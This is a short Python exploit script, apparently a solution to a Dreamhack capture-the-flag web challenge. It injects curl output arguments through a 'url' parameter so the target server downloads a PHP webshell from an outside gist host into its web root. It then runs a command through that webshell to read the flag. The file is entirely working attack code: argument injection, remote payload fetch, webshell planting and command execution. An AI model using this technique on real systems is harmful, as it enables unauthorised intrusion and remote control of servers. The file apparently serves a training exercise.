import requests

port = 19791
url_index = f"http://host3.dreamhack.games:{port}/"
url = "https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php"
url_inject = url_index + f"?url={url}%20-o%20/var/www/html/cache/webshell.php"

response = requests.get(url_inject)

cmd = "/flag"
url_webshell = url_index + f"cache/webshell.php/?cmd={cmd}"

response = requests.get(url_webshell)
print(response.text)
